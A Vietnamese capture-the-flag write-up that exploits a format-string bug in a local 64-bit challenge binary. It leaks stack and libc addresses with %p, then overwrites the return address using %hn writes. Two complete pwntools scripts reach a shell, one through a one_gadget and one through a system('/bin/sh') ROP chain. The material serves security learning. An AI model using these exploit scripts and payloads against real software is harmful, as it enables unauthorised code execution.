## Lược qua:

Sử dụng lỗ hổng format strings để khai thác từ việc leak libc, write shell và thực thi

___
## Cách giải:
### Thông tin:
Kiểm tra thông tin file:
```python                                                                                                
┌──(kali㉿kali)-[~/CTFs/testCTF/fmtstring1]
└─$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=27e9b2e732eb3f9bed3b3f248f212ac998a5263a, for GNU/Linux 3.2.0, not stripped
                                                                                                   
┌──(kali㉿kali)-[~/CTFs/testCTF/fmtstring1]
└─$ checksec --file=chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   43 Symbols  No     0               2               chall
```
* file ELF 64-bit và dynamically linked
* chỉ có `canary` tắt

Disassembly code:
```c
int main(void)

{
  int check;
  char buffer [64];
  
  setup();
  do {
    fgets(buffer,64,stdin);
    printf(buffer);
    check = strncmp(buffer,"quit",4);
  } while (check != 0);
  return 0;
}
```
* `printf(buffer);`: lỗ hổng format string
* `do { .. } while`: cho phép sử dụng fmt str nhiều lần
___
### Khai thác:
* Trước hết chạy thử payload format string `%p`:
```python
payload = b'AAAA %p %p %p %p %p'
p.sendline(payload)
```

<img width="804" height="101" alt="image" src="https://github.com/user-attachments/assets/eef33098-eb1b-4393-b09c-2f84b04700b7" />
<img width="807" height="519" alt="image" src="https://github.com/user-attachments/assets/29ef0a16-1531-49a4-8cb8-f100c0652fae" />

Thấy được là `%p` thứ 3 leak được địa chỉ buffer

Note tìm hiểu được: với file 64-bit, 6 arguments đầu tiên của printf là nằm ở thanh ghi, tới argument thứ 7 là nằm trên stack

* Bên cạnh đấy, thấy được địa chỉ `return` của `main()`:

<img width="806" height="388" alt="image" src="https://github.com/user-attachments/assets/21a9dc96-7f6d-4dd7-9f6d-d5f7ec1de89e" />

Để tính ra vị trí format string của return, ta áp dụng
```python
(địa chỉ - rsp)/8 + 6
```
( `.. + 6` vì format string bắt đầu đọc từ stack tại offset thứ 6)

Như sau:

<img width="804" height="498" alt="image" src="https://github.com/user-attachments/assets/b85f60d8-6f10-4f8e-bff2-3e8a3a5b4a2d" />

* Vậy ta có:
```python
payload = b'%3$p' + b' %15$p' 
p.sendline(payload)
```
Kiểm chứng lại:

<img width="802" height="125" alt="image" src="https://github.com/user-attachments/assets/394efdf2-c677-4927-a8ae-5db4139ac27c" />

<img width="801" height="329" alt="image" src="https://github.com/user-attachments/assets/198159ce-f875-4e8b-9898-b464e0aab4dd" />


* Để tìm địa chỉ libc base, ta tìm offset giữa libc_leak và libc_base (tại runtime):

<img width="806" height="509" alt="image" src="https://github.com/user-attachments/assets/64efce5d-e2cb-4cd6-bd0c-9ff1ce9f8265" />

<img width="808" height="588" alt="image" src="https://github.com/user-attachments/assets/d0428caa-b11c-4b3e-ac2b-8a5eaf3bf714" />

```python
offset = 0x29ca8
```
Vậy tính libc base mặc định bằng cách:
```python
libc.address = leak_libc - 0x29ca8
```
Kiểm tra:

<img width="808" height="157" alt="image" src="https://github.com/user-attachments/assets/f49f8bf3-e554-4365-90c0-4154cf690727" />

<img width="808" height="810" alt="image" src="https://github.com/user-attachments/assets/78f5a7f1-2198-41cb-8554-c8b8e6b5d26b" />

* Tiếp đến là bước tạo shell, ta sẽ dùng one_gadget:

<img width="808" height="419" alt="image" src="https://github.com/user-attachments/assets/e440daff-286c-456b-8525-07725c47d8bb" />

Tính địa chỉ gadget:
```
gadget_offset = 0xddf43
gadget = libc.address + gadget_offset
```
ta sẽ sử dụng format string `%n` để overwrite vào địa chỉ trên rip và sau nó 

và overwrite từng 2 byte một vào return address qua mỗi vòng while (vì viết hết vào thì rất lớn)

**C1: one_gadget**
```python
i: 1 -> 3

part1 = (gadget >> 16*i) & 0xffff
payload1 = f'%{part1}c%8$hn'.encode()
payload1 = payload1.ljust(16, b'A')
payload1 += p64(return_addr + 2*i)
p.sendline(payload1)
p.recv()
```

Giả sử:
```python
gadget: 0x7f21 dffa 006f
return_addr = 0x7fffe86afa78
```
* {006f: 0x7fffe86afa78}
  ```
  %111c%8$hnAAAAAA\x78\xfa\x6a\xe8\xff\x7f\x00\x00
  ```
* {dffa: 0x7fffe86afa78 + 2}
  ```
  %57338c%8$hnAAAA\x7a\xfa\x6a\xe8\xff\x7f\x00\x00
  ```
* {7f21: 0x7fffe86afa78 + 4}
  ```
  %32545c%8$hnAAAA\x7c\xfa\x6a\xe8\xff\x7f\x00\x00
  ```

<img width="802" height="204" alt="image" src="https://github.com/user-attachments/assets/b6284bba-433b-4c90-90c9-8872c15d34c4" />
<img width="800" height="200" alt="image" src="https://github.com/user-attachments/assets/80df38dd-9022-48c3-afa7-0f2df83a6dd7" />
<img width="802" height="196" alt="image" src="https://github.com/user-attachments/assets/7ba1f31f-7b23-4aab-938c-29a4aa007620" />
<img width="808" height="200" alt="image" src="https://github.com/user-attachments/assets/5f8478be-6857-4032-b42d-867d4834c864" />
<img width="819" height="235" alt="image" src="https://github.com/user-attachments/assets/01ddb9e8-74ae-4145-bf77-eb1df970aa60" />

Script:
```python
from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
context.log_level = 'info'

libc = ELF('libc.so.6', checksec=False)

def GDB():
	gdb.attach(p, gdbscript='''
	br *main + 38
	br *main + 53

	x/20gx $rsp
	tel
	''')

p = process(exe.path)
GDB()

# leak 
payload = b'%3$p' + b' %15$p' 
p.sendline(payload)

datas = p.recvline().split(b' ')
buffer = int(datas[0], 16)
leak_libc = int(datas[1], 16)

log.info(f"Buffer: {hex(buffer)}")
log.info(f"Leak_libc: {hex(leak_libc)}")

libc.address = leak_libc - 0x29ca8

log.info(f"Libc base: {hex(libc.address)}")

# shell
return_addr = buffer + 0x48
log.info(f"ret addr: {hex(return_addr)}")

# 0xddf43
# 0xfb062
# 0xfb06a
# 0xfb06f
gadget_offset = 0x583ec
gadget = libc.address + gadget_offset
log.info(f"gadget: {hex(gadget)}")

part1 = gadget & 0xffff
payload1 = f'%{part1}c%8$hn'.encode()
payload1 = payload1.ljust(16, b'A')
payload1 += p64(return_addr)
p.sendline(payload1)
p.recv()
p.clean(timeout=0.2)

part2 = (gadget >> 16) & 0xffff
payload2 = f'%{part2}c%8$hn'.encode() 
payload2 = payload2.ljust(16, b'A')
payload2 += p64(return_addr + 2)
p.sendline(payload2)
p.recv()
p.clean(timeout=0.2)

part3 = (gadget >> 32) & 0xffff
payload3 = f'%{part3}c%8$hn'.encode()
payload3 = payload3.ljust(16, b'A')
payload3 += p64(return_addr + 4)
p.sendline(payload3)
p.recv()
p.clean(timeout=0.2)

p.sendline(b'quit')

p.interactive()

# [*] ret addr: 0x7ffdeb5f6258
# [*] gadget: 0x7fe0af1403ec

```

**C2: ROP chain**

Vì ta đã có libc base, ta cũng có thể tạo ROP chain và overwrite với format string `%n` từ `rip` đổ lên:

Stack từ rip trông như sau:
```
# [ret_addr + 0 ] : pop_rdi
# [ret_addr + 8 ] : bin_sh
# [ret_addr + 16] : ret  
# [ret_addr + 24] : system
```
* lấy từng gadget trong chain
* chia nhỏ ra làm 2 bytes một
* và overwrite từng đấy byte vào memory block 8-byte
* cuối cùng "quit" để `rsp` -> `rip` trỏ và thực thi payload

<img width="806" height="576" alt="pop rdi" src="https://github.com/user-attachments/assets/bbf6cef9-9620-4adc-bf89-81d8d497df68" />

<img width="800" height="584" alt="pop rdi2" src="https://github.com/user-attachments/assets/d5ee38a8-48f5-4de0-8b0a-f7f0df64b3bc" />


Script:
```python
from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
context.log_level = 'info'

def GDB():
    gdb.attach(p, gdbscript='''
    br *main + 38
    br *main + 53

    x/20gx $rsp
    tel
    ''')

p = process(exe.path)
GDB()

# leak (fmtstr)
p.sendline(b'%3$p %15$p')
datas = p.recvline().split()
buffer_leak = int(datas[0], 16)
libc_leak   = int(datas[1], 16)

libc.address = libc_leak - 0x29ca8 
log.success(f"Libc Base: {hex(libc.address)}")

# rop exploit
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] 
ret_gadget = rop.find_gadget(['ret'])[0]         
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh'))

log.info(f"pop_rdi: {hex(pop_rdi)}")
log.info(f"bin_sh : {hex(bin_sh_addr)}")

chain = [pop_rdi, bin_sh_addr, ret_gadget, system_addr]

ret_addr = buffer_leak + 0x48

# overwrite stack
for i, rop_gad in enumerate(chain):
    addr_block = ret_addr + (i * 8) # rip (8byte) + 8 bytes + 8 bytes + 8 bytes
    
    for j in range(3):
        # laays 2 bytes rop_gadget nhets vao 2-byte addr_block
        part = (rop_gad >> (16 * j)) & 0xffff  
        position = addr_block + (j * 2)
        
        payload = f'%{part}c%8$hn'.encode()
        payload = payload.ljust(16, b'A') 
        payload += p64(position)
        
        p.sendline(payload)
        p.clean(timeout=0.1)

# quit - kich hoat paylaod
p.sendline(b'quit') 

p.interactive()
```

Và nhận được interactive shell:

<img width="808" height="259" alt="image" src="https://github.com/user-attachments/assets/4b351a73-f30e-4866-bdbe-c72853273035" />














